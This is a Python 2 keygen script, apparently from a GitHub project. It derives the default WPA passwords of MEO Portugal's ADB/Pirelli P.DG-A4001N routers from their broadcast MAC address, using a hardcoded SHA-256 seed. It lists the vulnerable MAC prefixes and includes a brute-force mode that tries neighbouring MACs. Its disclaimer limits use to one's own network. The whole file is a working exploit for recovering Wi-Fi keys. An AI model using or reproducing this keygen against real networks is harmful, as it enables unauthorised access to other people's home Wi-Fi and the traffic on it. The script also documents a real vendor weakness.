#!/usr/bin/env python
# -*- coding: utf-8 -*-


'''
@license: GPLv3
@twitter: @TheAndrewGomes

-----------------
[*] Target      : 
-----------------
Vendor           : ADB broadband Pirelli
Router           : Model P.DG-A4001N
ISP              : MEO Portugal
'''

import re
import sys
import hashlib
import argparse

VERSION     = 1
SUBVERSION  = 5
DATEVERSION = '2015-07-20' 
URL         = 'https://github.com/AndrewGomes/ADSLPT-WPA'

def genkey(mac,stdout='True'):
    seed = ('\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15' +
            '\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8')

    lookup  = '0123456789abcdefghijklmnopqrstuvwxyz'

    sha256 = hashlib.sha256()
    sha256.update(seed)
    sha256.update('1236790')
    sha256.update(mac)

    digest = bytearray(sha256.digest())

    if (stdout):
        print "[+] SHA256  : %s" % sha256.hexdigest()
        
    return ''.join([lookup[x % len(lookup)] for x in digest[0:10]])


def printTargets():
        print "[+] Possiveis alvos:"
        for t in targets:
            print ("\t bssid: {0:s}:XX:XX:XX \t SSID: ADSLPT-ABXXXXX".format(t.upper()))

        sys.exit()

def checkTargets(bssid):
        supported = False
        for t in targets:
            if ( bssid.upper().startswith(t) ):
                supported = True
                break
        if (not supported):
            print "[!] O bssid parece não ser suportado! Gerando chave na mesma."

def addIncToMac(mac_str, inc):
    try:
        mac = bytearray.fromhex('%012x' %(int(mac_str,16) + inc))
    except:
        sys.exit('[!] Use real input :)')
    return mac

def main():
    
    global targets
    version = " {0:d}.{1:d}  [{2:s}] ----> {3:s}".format(VERSION,SUBVERSION,DATEVERSION,URL) 
    targets = ['00:08:27','00:13:C8','00:17:C2','00:19:3E','00:1C:A2','00:1D:8B','00:22:33','00:8C:54',
    '30:39:F2','74:88:8B','84:26:15','A4:52:6F','A4:5D:A1','D0:D4:12','D4:D1:84','DC:0B:1A','F0:84:2F']
    
    parser = argparse.ArgumentParser(description='''>>> Keygen para as redes WiFi da MEO com o SSID ADSLPT-ABXXXXX
                                                        Não me responsabilizo por qualquer problema que 
                                                        o uso indevido deste codigo, te possa causar
                                                        seja de que forma for. Este codigo serve apenas para 
                                                        testar a segurança da tua rede, pelo que se usares este codigo
                                                        noutra rede que não seja a tua não serei responsavel!!   ''',
                                                 epilog='''(+) Ajuda: python %s -b 11:22:33:44:55:66 ''' %(sys.argv[0])
                                    )
   
    maingroup = parser.add_argument_group(title='required')
    maingroup.add_argument('-b','--bssid', type=str, nargs='?', help='Endereço MAC do Router')
    parser.add_argument('-v', '--versão', action='version', version='%(prog)s'+version)
    command_group = parser.add_mutually_exclusive_group()
    command_group.add_argument('-l','--list', help='Mostrar vulnerabilidades', action='store_true')
    command_group.add_argument('-a','--allkeys', help='Bruteforce', action="store_true")
    
    
    args = parser.parse_args()

    if args.list:
        printTargets()
    elif args.bssid:
        mac_str = re.sub(r'[^a-fA-F0-9]', '', args.bssid)
        if len(mac_str) != 12:
            sys.exit('[!] Verifica o formato do endereço MAC!\n')  
        try:
            
            checkTargets(args.bssid) 
            print '[+] MAC     : %s' % args.bssid

            if (args.allkeys):                
                print '\n[+] Chaves possiveis para o SSID: ADSLPT-ABXXXXX'
                for i in xrange(-2,5):
                    mac = addIncToMac(mac_str,i)
                    print '%-10s' % ((genkey(mac, False)[:8]))
                    
            else:
                wpa = genkey((addIncToMac(mac_str,0)), False)
                print '[+] WPA key : %-10s\t%-10s' % (wpa[:8], "SSID: ADSLPT-ABXXXXX" ) 

        except:
            sys.exit('[!] Ocorreu um erro')
    else:
	parser.print_help()

if __name__ == "__main__":
    main()
